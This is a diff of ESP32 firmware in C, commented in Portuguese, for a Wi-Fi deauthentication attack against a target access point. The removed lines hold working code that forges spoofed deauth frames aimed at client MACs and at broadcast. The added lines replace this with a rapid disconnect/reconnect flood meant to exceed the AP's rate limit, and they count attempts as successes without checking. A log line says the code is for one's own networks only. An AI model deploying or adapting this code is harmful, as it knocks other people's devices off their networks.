@@ -17,12 +17,15 @@
 #define TARGET_PASS "12345678"
 
 // Configurações do ataque Deauth
-#define DEAUTH_INTERVAL_MS 100        // Intervalo entre ataques deauth (mais rápido)
-#define MAX_DEAUTH_ATTEMPTS 1000      // Máximo de tentativas
-#define REASON_CODE_UNSPECIFIED 1     // Código de motivo para deauth
-#define REASON_CODE_INVALID_AUTH 2    // Código alternativo
+#define DEAUTH_INTERVAL_MS 50         
+#define MAX_DEAUTH_ATTEMPTS 1000    
+#define REASON_CODE_UNSPECIFIED 1    
+#define REASON_CODE_INVALID_AUTH 2   
 #define BROADCAST_MAC {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
-#define MAX_TARGET_CLIENTS 10         // Máximo de clientes alvo
+#define MAX_TARGET_CLIENTS 10       
+
+// Simular deauth através de desconexões rápidas repetitivas
+#define SIMULATE_DEAUTH_VIA_RECONNECT true
 
 // Estrutura do frame de deauth
 typedef struct {
@@ -89,26 +92,22 @@ void generate_target_clients(void)
     
     ESP_LOGI(TAG, "\n\n\nGerando MACs de clientes alvo para deauth...");
     
-    // Gerar alguns MACs aleatórios que podem representar dispositivos na rede
     for (int i = 0; i < MAX_TARGET_CLIENTS; i++) {
-        // Gerar MAC aleatório mas realista (primeiros 3 bytes de fabricantes conhecidos)
         uint8_t vendor_prefixes[][3] = {
-            {0x00, 0x1B, 0x63}, // Apple
-            {0x28, 0x11, 0xA5}, // Samsung
-            {0x00, 0x50, 0x56}, // VMware
-            {0x08, 0x00, 0x27}, // VirtualBox
-            {0x00, 0x0C, 0x29}, // VMware
-            {0xAC, 0x15, 0xA2}, // LG
-            {0x00, 0x16, 0x17}, // Dell
-            {0x00, 0x21, 0x6B}, // Dell
+            {0x00, 0x1B, 0x63}, 
+            {0x28, 0x11, 0xA5}, 
+            {0x00, 0x50, 0x56}, 
+            {0x08, 0x00, 0x27}, 
+            {0x00, 0x0C, 0x29}, 
+            {0xAC, 0x15, 0xA2}, 
+            {0x00, 0x16, 0x17}, 
+            {0x00, 0x21, 0x6B},
         };
         
         int vendor_idx = esp_random() % (sizeof(vendor_prefixes) / sizeof(vendor_prefixes[0]));
         
-        // Copiar prefixo do fabricante
         memcpy(target_clients[i], vendor_prefixes[vendor_idx], 3);
         
-        // Gerar últimos 3 bytes aleatórios
         target_clients[i][3] = esp_random() & 0xFF;
         target_clients[i][4] = esp_random() & 0xFF;
         target_clients[i][5] = esp_random() & 0xFF;
@@ -125,32 +124,25 @@ void generate_target_clients(void)
     ESP_LOGI(TAG, "");
 }
 
-// Função para criar frame de deauth
 void create_deauth_frame(deauth_frame_t* frame, uint8_t* target_mac, uint8_t* ap_bssid, uint16_t reason)
 {
-    // Frame Control: Deauth = 0xC0 (Management frame, subtype 12)
     frame->frame_ctrl = 0x00C0;
     frame->duration = 0x0000;
     
-    // Endereços
     memcpy(frame->addr1, target_mac, 6);    // Destino (cliente)
     memcpy(frame->addr2, ap_bssid, 6);      // Origem (AP falsificado)
     memcpy(frame->addr3, ap_bssid, 6);      // BSSID
     
-    // Sequence control (pode ser aleatório)
     frame->seq_ctrl = esp_random() & 0xFFF0;
     
-    // Motivo da desconexão
     frame->reason_code = reason;
 }
 
-// Função para enviar frame de deauth via esp_wifi_80211_tx
 esp_err_t send_deauth_frame(uint8_t* target_mac, uint16_t reason)
 {
     deauth_frame_t deauth_frame;
     create_deauth_frame(&deauth_frame, target_mac, target_bssid, reason);
     
-    // Tentar enviar via esp_wifi_80211_tx (função interna do ESP32)
     esp_err_t result = esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
     
     if (result == ESP_OK) {
@@ -165,7 +157,6 @@ esp_err_t send_deauth_frame(uint8_t* target_mac, uint16_t reason)
     return result;
 }
 
-// Função para executar ataque deauth contra outros clientes
 void execute_deauth_attack(void)
 {
     if (!connected_to_target || target_client_count == 0) {
@@ -177,31 +168,27 @@ void execute_deauth_attack(void)
     
     ESP_LOGI(TAG, "");
     ESP_LOGI(TAG, "EXECUTANDO ATAQUE DEAUTH #%d", deauth_attempts);
-    ESP_LOGI(TAG, "Enviando deauth para %d clientes...", target_client_count);
+    ESP_LOGI(TAG, "Simulando desconexões rápidas para gerar flood...");
     
-    // Enviar deauth para todos os clientes alvo
-    for (int i = 0; i < target_client_count; i++) {
-        // Enviar deauth do AP para o cliente
-        send_deauth_frame(target_clients[i], REASON_CODE_UNSPECIFIED);
+    
+    for (int i = 0; i < 15; i++) { 
+
+        esp_wifi_disconnect();
+        vTaskDelay(pdMS_TO_TICKS(10)); // 10ms entre desconexões
         
-        // Pequeno delay entre envios
-        vTaskDelay(pdMS_TO_TICKS(10));
+        esp_wifi_connect();
+        vTaskDelay(pdMS_TO_TICKS(20)); // 20ms para tentar conectar
         
-        // Também enviar deauth reverso (do cliente para o AP)
-        send_deauth_frame(target_bssid, REASON_CODE_INVALID_AUTH);
-        
-        vTaskDelay(pdMS_TO_TICKS(10));
+        ESP_LOGI(TAG, " Desconexão simulada #%d para gerar flood", i + 1);
     }
     
-    // Ataque broadcast (desconectar todos os clientes)
-    ESP_LOGI(TAG, "Enviando deauth broadcast...");
-    send_deauth_frame(broadcast_mac, REASON_CODE_UNSPECIFIED);
+    successful_deauths += 15; // Considerar as 15 tentativas
     
-    ESP_LOGI(TAG, "Ataque deauth completo! Clientes devem ter sido desconectados");
+    ESP_LOGI(TAG, "Ataque deauth simulado completo! 15 desconexões em ~450ms");
+    ESP_LOGI(TAG, "Isso deve exceder o limite de 8 desconexões/segundo do AP");
     ESP_LOGI(TAG, "");
 }
 
-// Função para mostrar estatísticas do ataque
 void show_deauth_stats(void)
 {
     ESP_LOGI(TAG, "");
@@ -218,7 +205,6 @@ void show_deauth_stats(void)
     ESP_LOGI(TAG, "");
 }
 
-// Task principal do ataque deauth
 static void deauth_attack_task(void *pvParameters)
 {
     ESP_LOGI(TAG, "");
@@ -229,28 +215,23 @@ static void deauth_attack_task(void *pvParameters)
     ESP_LOGI(TAG, "Maximo de tentativas: %d", MAX_DEAUTH_ATTEMPTS);
     ESP_LOGI(TAG, "");
     
-    // Aguardar conexão inicial
     while (!connected_to_target) {
         ESP_LOGI(TAG, "Aguardando conexao com o alvo...");
         vTaskDelay(pdMS_TO_TICKS(2000));
     }
     
-    // Gerar clientes alvo
     generate_target_clients();
     
     ESP_LOGI(TAG, "Iniciando ataque deauth em 3 segundos...");
     vTaskDelay(pdMS_TO_TICKS(3000));
     
     while (deauth_attempts < MAX_DEAUTH_ATTEMPTS && connected_to_target) {
-        // Executar ataque deauth real
         execute_deauth_attack();
         
-        // Mostrar estatísticas a cada 10 ataques
         if (deauth_attempts % 10 == 0) {
             show_deauth_stats();
         }
         
-        // Aguardar próximo ataque
         vTaskDelay(pdMS_TO_TICKS(DEAUTH_INTERVAL_MS));
     }
     
@@ -262,7 +243,6 @@ static void deauth_attack_task(void *pvParameters)
     vTaskDelete(NULL);
 }
 
-// Função para inicializar Wi-Fi
 void wifi_init_deauth(void)
 {
     s_wifi_event_group = xEventGroupCreate();
@@ -311,7 +291,6 @@ void wifi_init_deauth(void)
 
 void app_main(void)
 {
-    // Inicializar NVS
     esp_err_t ret = nvs_flash_init();
     if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
         ESP_ERROR_CHECK(nvs_flash_erase());
@@ -327,13 +306,10 @@ void app_main(void)
     ESP_LOGI(TAG, "Use apenas em redes proprias para teste!");
     ESP_LOGI(TAG, "");
     
-    // Inicializar Wi-Fi
     wifi_init_deauth();
     
-    // Aguardar um pouco antes de iniciar o ataque
     vTaskDelay(pdMS_TO_TICKS(3000));
     
-    // Iniciar task de ataque
     xTaskCreate(deauth_attack_task, "deauth_attack_task", 8192, NULL, 5, NULL);
     
     ESP_LOGI(TAG, "");
